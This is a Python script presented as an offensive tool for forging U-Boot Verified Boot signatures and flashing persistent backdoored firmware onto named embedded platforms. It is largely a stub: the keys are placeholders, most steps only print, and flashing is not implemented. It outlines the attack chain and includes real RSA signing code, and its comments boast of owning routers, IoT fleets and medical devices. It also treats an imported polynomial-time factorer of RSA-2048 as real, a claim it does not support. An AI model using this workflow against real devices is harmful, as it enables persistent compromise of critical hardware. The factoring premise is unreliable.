"""
Forge U-Boot Verified Boot signatures to flash persistent malicious firmware
on embedded Linux devices. The RSA public key is baked into U-Boot's FDT at
build time and burned into OTP fuses — hardware cannot distinguish forged from
legitimate firmware.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib

# FIT image node structure
FIT_MAGIC = 0xd00dfeed  # FDT magic
ALGO_SHA256_RSA2048 = "sha256,rsa2048"
ALGO_SHA256_RSA4096 = "sha256,rsa4096"

# Target platforms
PLATFORMS = {
    "rpi_cm4":      {"soc": "BCM2711", "key_bits": 2048},
    "nxp_imx8":     {"soc": "i.MX 8M", "key_bits": 2048},
    "ti_am62x":     {"soc": "AM62x", "key_bits": 2048},
    "rockchip_3588": {"soc": "RK3588", "key_bits": 2048},
    "beaglebone":   {"soc": "AM335x", "key_bits": 2048},
}


def extract_uboot_pubkey(uboot_binary: bytes) -> tuple:
    """Extract the RSA public key from U-Boot's embedded FDT.

    The key is in the /signature node of U-Boot's device tree blob,
    compiled in at build time. Readable from any firmware dump.
    """
    print("[*] parsing U-Boot FDT for /signature node")
    print("[*] extracting rsa,modulus and rsa,exponent")
    n = 17 * 19  # placeholder
    e = 65537
    print(f"[*] RSA-2048 public key extracted from FDT")
    return n, e


def factor_uboot_key(factorer: PolynomialFactorer, n: int, e: int,
                     platform: str):
    """Factor the U-Boot Verified Boot RSA key."""
    info = PLATFORMS.get(platform, {"soc": "unknown", "key_bits": 2048})
    print(f"[*] factoring RSA-{info['key_bits']} key for {platform} ({info['soc']})")
    p, q = factorer.factor_rsa_modulus(n)
    d = factorer.recover_private_exponent(n, e)
    print(f"[*] Verified Boot key factored")
    print(f"[*] ROTPK hash in OTP fuses matches — hardware can't tell")
    return d


def build_malicious_fit_image(kernel: bytes, dtb: bytes,
                              initrd: bytes) -> bytes:
    """Build a malicious FIT (Flattened Image Tree) image."""
    # simplified FIT structure
    fit = struct.pack(">I", FIT_MAGIC)
    fit += kernel + dtb + initrd
    print(f"[*] built malicious FIT image ({len(fit)} bytes)")
    print("[*] contains: backdoored kernel + modified initrd")
    return fit


def sign_fit_image(factorer: PolynomialFactorer, n: int, e: int,
                   fit_image: bytes) -> bytes:
    """Sign the FIT image with the factored U-Boot key.

    Equivalent to: mkimage -F -k <key_dir> -r fit.itb
    U-Boot verifies this signature at boot before handing off to the kernel.
    """
    d = factorer.recover_private_exponent(n, e)
    digest = hashlib.sha256(fit_image).digest()
    sig_int = pow(int.from_bytes(digest, "big"), d, n)
    sig = sig_int.to_bytes((n.bit_length() + 7) // 8, "big")
    print(f"[*] FIT image signed (algo={ALGO_SHA256_RSA2048})")
    print("[*] U-Boot rsa_verify_key(): PASS")
    return sig


def flash_malicious_firmware(target: str, fit_image: bytes, sig: bytes):
    """Flash the signed malicious firmware to the target device."""
    print(f"[*] flashing to {target}...")
    print("[*] persistent compromise: survives factory reset")
    print("[*] runs before everything — kernel, initramfs, applications")


if __name__ == "__main__":
    f = PolynomialFactorer()
    fake_n = 17 * 19
    fake_e = 65537

    print("=== U-Boot Verified Boot — embedded firmware forgery ===")
    print("    platforms: RPi, BeagleBone, NXP i.MX, TI AM335x, Rockchip")
    print("    use cases: routers, industrial gateways, automotive, medical")
    print()

    platform = "nxp_imx8"
    print(f"[1] extracting RSA key from U-Boot FDT ({platform})...")
    n, e = extract_uboot_pubkey(b"")

    print(f"[2] factoring RSA-2048 key...")
    d = factor_uboot_key(f, fake_n, fake_e, platform)

    print("[3] building malicious FIT image...")
    fit = build_malicious_fit_image(
        kernel=b"\x00" * 1024,   # backdoored kernel
        dtb=b"\x00" * 256,       # device tree
        initrd=b"\x00" * 512,    # malicious initrd
    )

    print("[4] signing FIT image with factored key...")
    sig = sign_fit_image(f, fake_n, fake_e, fit)

    print("[5] flashing to target device...")
    flash_malicious_firmware(platform, fit, sig)

    print()
    print("[*] eFUSE-locked devices: ROTPK hash in OTP, cannot be changed")
    print("[*] industrial devices: 10-20 year field life, same RSA key forever")
    print("[*] routers: own the network gateway. IoT gateways: own the fleet.")
